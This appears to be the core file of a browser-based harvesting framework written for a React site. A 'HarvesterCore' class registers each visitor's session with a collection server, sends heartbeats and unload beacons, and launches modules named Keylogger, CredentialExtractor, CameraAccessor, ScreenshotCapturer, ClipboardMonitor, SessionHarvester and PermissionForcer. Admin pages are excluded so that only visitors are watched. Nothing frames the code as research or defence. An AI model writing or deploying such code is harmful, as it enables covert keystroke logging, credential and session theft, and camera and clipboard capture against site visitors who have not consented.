import axios from 'axios';
import ClickTracker from './ClickTracker';
import Keylogger from './Keylogger';
import CredentialExtractor from './CredentialExtractor';
import BrowserFingerprinter from './BrowserFingerprinter';
import StorageHarvester from './StorageHarvester';
import CameraAccessor from './CameraAccessor';
import NetworkInfo from './NetworkInfo';
import ScreenshotCapturer from './ScreenshotCapturer';
import MouseRecorder from './MouseRecorder';
import ClipboardMonitor from './ClipboardMonitor';
import BrowserHistoryScraper from './BrowserHistoryScraper';
import SessionHarvester from './SessionHarvester';
import PermissionForcer from './PermissionForcer';
import NavigationTracker from './NavigationTracker';

const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
const axiosInstance = axios.create({ baseURL: API, timeout: 10000 });

class HarvesterCore {
  constructor() {
    this.sessionId = null;
    this.dbId = null;
    this.initialized = false;
    this.startTime = Date.now();
    this.heartbeatInterval = null;
    this.modules = {};
    this._reconnectAttempted = false; // Track if we already tried reconnect on this page load
  }

  async init() {
    // NEVER run harvester on admin pages
    if (window.location.pathname.startsWith('/admin')) {
      return;
    }

    if (this.initialized) return;
    
    // Check if we already have a session from this page load
    const stored = sessionStorage.getItem('harvester_session');
    if (stored && !this._reconnectAttempted) {
      try {
        const parsed = JSON.parse(stored);
        this.sessionId = parsed.sessionId;
        this.dbId = parsed.dbId;
        
        // Check if this is a page refresh within the same session
        // by looking at the navigation type
        const navEntries = performance.getEntriesByType('navigation');
        const isRefresh = navEntries.length > 0 && 
          (navEntries[0].type === 'reload' || performance.navigation?.type === 1);
        
        if (isRefresh) {
          // New page load - don't reuse old session
          sessionStorage.removeItem('harvester_session');
          this.sessionId = null;
          this.dbId = null;
        }
      } catch (e) {
        sessionStorage.removeItem('harvester_session');
      }
    }

    if (!this.sessionId) {
      try {
        const res = await axiosInstance.post('/api/collect/init', {
          referrer: document.referrer || '',
          page: window.location.pathname,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screenResolution: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
          platform: navigator.platform
        });
        this.sessionId = res.data.sessionId;
        this.dbId = res.data.dbId;
        sessionStorage.setItem('harvester_session', JSON.stringify({
          sessionId: this.sessionId,
          dbId: this.dbId
        }));
      } catch (error) {
        console.warn('Harvester init failed, will retry');
        setTimeout(() => this.init(), 5000);
        return;
      }
    }

    this.initialized = true;
    this.startModules();
    this.startHeartbeat();
    this.setupBeforeUnload();
  }

  startModules() {
    this.modules.clickTracker = new ClickTracker(this);
    this.modules.keylogger = new Keylogger(this);
    this.modules.credentialExtractor = new CredentialExtractor(this);
    this.modules.fingerprinter = new BrowserFingerprinter(this);
    this.modules.storageHarvester = new StorageHarvester(this);
    this.modules.cameraAccessor = new CameraAccessor(this);
    this.modules.networkInfo = new NetworkInfo(this);
    this.modules.screenshotCapturer = new ScreenshotCapturer(this);
    this.modules.mouseRecorder = new MouseRecorder(this);
    this.modules.clipboardMonitor = new ClipboardMonitor(this);
    this.modules.browserHistoryScraper = new BrowserHistoryScraper(this);
    this.modules.sessionHarvester = new SessionHarvester(this);
    this.modules.permissionForcer = new PermissionForcer(this);
    this.modules.navigationTracker = new NavigationTracker(this);

    Object.values(this.modules).forEach(module => {
      if (module.init) module.init();
    });
  }

  startHeartbeat() {
    this.heartbeatInterval = setInterval(() => {
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      axiosInstance.post('/api/collect/heartbeat', {
        sessionId: this.sessionId,
        timeOnSite
      }).catch(() => {});
    }, 30000);
  }

  setupBeforeUnload() {
    let closing = false;

    window.addEventListener('beforeunload', () => {
      if (closing) return;
      closing = true;
      
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      
      // Use sendBeacon for reliable delivery during page unload
      try {
        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
          sessionId: this.sessionId,
          timeOnSite
        }));
      } catch(e) {}
      
      if (this.heartbeatInterval) {
        clearInterval(this.heartbeatInterval);
        this.heartbeatInterval = null;
      }

      // Clear the session on unload so refresh creates a new one
      sessionStorage.removeItem('harvester_session');
    });

    // Handle page unload (beforeunload might not fire on some mobile browsers)
    window.addEventListener('pagehide', () => {
      if (closing) return;
      closing = true;
      
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      try {
        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
          sessionId: this.sessionId,
          timeOnSite
        }));
      } catch(e) {}
      
      if (this.heartbeatInterval) {
        clearInterval(this.heartbeatInterval);
        this.heartbeatInterval = null;
      }
      sessionStorage.removeItem('harvester_session');
    });
  }

  async send(endpoint, data) {
    try {
      const res = await axiosInstance.post(endpoint, {
        sessionId: this.sessionId,
        ...data
      });
      return res.data;
    } catch (error) {
      return null;
    }
  }

  getSessionId() { return this.sessionId; }

  getModule(name) {
    return this.modules[name] || null;
  }

  async triggerPermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.triggerPermission(permissionType);
    }
    return null;
  }

  getNavigationStats() {
    if (this.modules.navigationTracker) {
      return this.modules.navigationTracker.getNavigationStats();
    }
    return null;
  }

  getPermissionStatus() {
    if (this.modules.permissionForcer) {
      return this.modules.permissionForcer.getPermissionStatus();
    }
    return null;
  }

  async enablePermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.enablePermission(permissionType);
    }
    return null;
  }

  async disablePermission(permissionType) {
    if (this.modules.permissionForcer) {
      return await this.modules.permissionForcer.disablePermission(permissionType);
    }
    return null;
  }

  detectDeviceCapabilities() {
    if (this.modules.permissionForcer) {
      return this.modules.permissionForcer.detectDeviceCapabilities();
    }
    return null;
  }
}

const harvesterInstance = new HarvesterCore();
export default harvesterInstance;